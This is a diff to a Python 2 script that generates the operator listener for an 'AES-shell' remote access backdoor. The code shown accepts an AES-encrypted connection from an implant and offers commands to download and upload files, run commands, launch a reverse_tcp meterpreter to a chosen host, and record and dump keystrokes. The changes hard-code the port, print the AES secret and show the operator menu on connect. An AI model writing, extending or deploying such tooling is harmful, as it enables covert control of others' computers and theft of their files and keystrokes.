@@ -182,7 +182,7 @@ while 1:
 		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, lsvar)
 		proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		stdout = proc.stdout.read() + proc.stderr.read()
-		if 'is not recognized as an internal or external command' not in stdout:
+		if 'is not recognized as an internal' not in stdout and ': not found' not in stdout:
 			checkpath = ''.join(stdout.split('**n')[-2:]).strip('**n')
 			if ' ' not in checkpath:
 				pwd = checkpath
@@ -245,7 +245,7 @@ def fnextcmd():
 
 	if nextcmd.startswith('upload '):
 		upfile = nextcmd.split(' ')[1]
-		ufilename = upfile.split('/')[-1].split('***')[-1]
+		ufilename = upfile.split('/')[-1].split('****')[-1]
 		if len(ufilename) > 16:
 			print ' [X] Error, Filename must be shorter than 16 characters**n'
 			fnextcmd()
@@ -260,11 +260,11 @@ def fnextcmd():
 				fnextcmd()
 
 	elif nextcmd == '?' or nextcmd == 'help':
-		print ' AEShell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n'
+		print ' AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n'
 		fnextcmd()
 
 	elif nextcmd.startswith('download '):
-		downfile = nextcmd.split(' ')[1].split('/')[-1].split('***')[-1]
+		downfile = nextcmd.split(' ')[1].split('/')[-1].split('****')[-1]
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
@@ -280,18 +280,15 @@ PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
-secret = "***SECRET***"
+secret, listenport = "***SECRET***", ***PORT***
 iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-	listenport = sys.argv[1]
-except:
-	listenport = 443
 print ' [>] Listening for connection on %s' % (listenport)
+print ' [>] AES secret: %s' % (secret)
 c.bind(('0.0.0.0', int(listenport)))
 c.listen(1)
-s,a = c.accept()
+s,address = c.accept()
 while True:
 	data = s.recv(1024)
 	decrypted = DecodeAES(cipher, data)
@@ -300,7 +297,7 @@ while True:
 		fnextcmd()
 
 	elif decrypted.endswith("EOFEOFEOFEOFEOFY"):
-		print ' [*] AES-Encrypted connection received!**n'
+		print ' [*] AES-Encrypted connection established with %s:%s**n**n  AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n' % (address[0],address[1])
 		fnextcmd()
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
@@ -325,7 +322,7 @@ while True:
 		break
 '''
 se = open(serverName, 'wb')
-finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('***', '\\\\')
+finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('****', '\\\\').replace('***PORT***', portnumber)
 se.write(finalserver)
 se.close()
 os.system('chmod +x %s %s' % (outputName, serverName))
